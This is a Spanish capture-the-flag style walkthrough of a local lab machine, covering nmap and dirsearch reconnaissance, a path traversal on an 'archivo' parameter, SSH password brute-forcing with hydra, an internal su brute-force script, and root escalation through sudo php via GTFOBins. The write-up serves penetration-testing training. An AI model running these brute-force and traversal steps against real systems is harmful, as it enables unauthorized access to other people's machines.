
# Big Pivoting (WIP)

## <mark style="color:purple;">Despliegue</mark>

```bash
sudo bash auto_deploy.sh inclusion.tar
[sudo] contraseña para kali: 

	                   ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         

Máquina desplegada desde inclusion.tar, sus direcciones IP son --> 10.10.10.2 20.20.20.2
```

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP `10.10.10.2` a través del navegador y entramos a la página de configuración de un servidor Apache:

<figure><img src="/files/6pz6OpXggNCRKiraX6Cp" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sCV -A -Pn 10.10.10.2    
[sudo] contraseña para kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 14:51 CEST

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
|_  256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.57 (Debian)
```

Solo encontramos 2 puertos abiertos, el 22 y el 80, los típicos.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch nos encontramos un directorio /shop interesante:

```bash
dirsearch -u http://10.10.10.2 -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.10.2/_24-10-02_14-59-20.txt

Target: http://10.10.10.2/

[14:59:20] Starting: 
[15:00:29] 301 -  307B  - /shop  ->  http://10.10.10.2/shop/

Task Completed
```

Nos encontramos con una tienda de teclados, en la que se imprime en el front un error de sistema:

<figure><img src="/files/ycR6c5N3nbHsY7bQ1tJR" alt=""><figcaption></figcaption></figure>

Esto nos dice que se está usando un parámetro llamado **archivo** en la url para pasarle un valor e incluir un archivo en la web y es un indicativo de que podríamos realizar un directory traversal, por ejemplo para leer el passwd:

<figure><img src="/files/9U199hEKvD0zvBDfq3qn" alt=""><figcaption></figcaption></figure>

Encontramos 3 usuarios con shell: root, seller y manchi.

Con esto podríamos hacer fuerza bruta para intentar acceder por SSH, ya que tiene también el puerto 22 abierto:

## <mark style="color:purple;">Bruteforce de SSH</mark>

```shell-session
afsh4ck@kali$ hydra -l manchi -P /usr/share/wordlists/rockyou.txt.gz -f 10.10.10.2 ssh 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-02 16:04:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: manchi   password: lovely
[STATUS] attack finished for 10.10.10.2 (valid pair found)
```

Obtenemos una contraseña válida y accedemos por SSH:

```shell-session
manchi@82fd2b03db42:/home$ ls                                                                                 
manchi  seller
manchi@82fd2b03db42:/home$ cd seller/                                                                         
-bash: cd: seller/: Permission denied
```

En el directorio home de manchi no encontramos nada relevante, por lo que vamos a pivotar al usuario seller, a ver si conseguimos algo interesante.

## <mark style="color:purple;">Bruteforce interno</mark>

Para ello vamos a usar este script de bruteforce:

{% embed url="<https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh>" %}

Nos lo descargamos en la máquina de atacante y nos la enviamos a la máquina víctima con un servidor local en python y wget:

<figure><img src="/files/kQN2upyTiw47erALN0Y0" alt=""><figcaption></figcaption></figure>

También nos enviamos una versión reducida del diccionario rockyou, como el `rockyou-20.txt` de Seclists. Ejecutamos el script y nos da la contraseña del usuario seller: `querty`

<figure><img src="/files/1rfVwIkPOD1w8ERm7QzZ" alt=""><figcaption></figcaption></figure>

Cambiamos al usuario seller con `su seller` y accedemos correctamente:&#x20;

<figure><img src="/files/wRbNqB7fYml47gaWaM6y" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;">Escalada de privilegios</mark>

Vamos a elevar nuestros privilegios. En la home de seller encontramos el historial de la terminal, y al leerlo vemos que ha ejecutado `sudo -l` para ver los permisos de ejecución.

Hacemos un `sudo -l` y observamos que este usuario seller puede ejecutar php libremente:

<figure><img src="/files/cCQddOmEiUh8Lz3zGxwf" alt=""><figcaption></figcaption></figure>

Podemos consultar GTFOBins para ver que podemos hacer en este punto, y nos encontramos una forma de elevar nuestros privilegios con php:

{% embed url="<https://gtfobins.github.io/gtfobins/php/>" %}

<figure><img src="/files/AfITyL0ZYZhAea4L6MFf" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/OcI9tW2f79PfrsshMzmo" alt=""><figcaption></figcaption></figure>

Y ya somos root!
